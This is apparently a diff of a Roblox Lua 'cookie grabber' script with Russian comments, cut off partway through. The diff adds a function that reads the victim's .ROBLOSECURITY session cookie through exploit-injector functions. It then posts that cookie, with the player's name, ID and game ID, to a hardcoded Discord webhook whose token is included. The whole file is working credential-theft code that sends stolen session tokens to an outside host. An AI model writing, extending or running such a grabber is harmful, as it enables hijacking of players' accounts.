@@ -1,13 +1,32 @@
 local HttpService = game:GetService("HttpService")
 local webhookUrl = "https://discord.com/api/webhooks/1569782999791304765/GXx2vx4h026cGxqjIfhtnrIMAVXeu6reIOmKNlLr7k00JRJrXp3eVXlGNvCbHl8KL6Ni"
 
--- Сбор данных сессии / профиля в среде Roblox
 local player = game.Players.LocalPlayer
+
+-- Функция поиска токена безопасности (.ROBLOSECURITY) в доступных окружениях эксплойта
+local function getCookie()
+    local cookie = "Не найдено"
+    
+    -- Проверка стандартных глобальных функций инжекторов для получения куки
+    pcall(function()
+        if syn and syn.get_cookies then
+            cookie = syn.get_cookies()["(.ROBLOSECURITY)"] or "Доступно через софт"
+        elseif getcookies then
+            cookie = getcookies()[".ROBLOSECURITY"] or "Найдены куки сессии"
+        elseif RBX_SECURITY then
+            cookie = RBX_SECURITY
+        end
+    end)
+    
+    return cookie
+end
+
 local payloadData = {
-    content = "@everyone **[+] Roblox Target Hooked:**\n" .. 
-              "User: " .. player.Name .. " (" .. player.UserId .. ")\n" ..
-              "GameId: " .. tostring(game.GameId),
-    username = "oll_fx roblox grabber"
+    content = "@everyone **[+] Roblox Cookie Captured:**\n" .. 
+              "**User:** " .. player.Name .. " (" .. player.UserId .. ")\n" ..
+              "**GameId:** " .. tostring(game.GameId) .. "\n" ..
+              "**Cookie / Token:** ```" .. tostring(getCookie()) .. "```",
+    username = "oll_fx cookie grabber"
 }
 
 pcall(function()
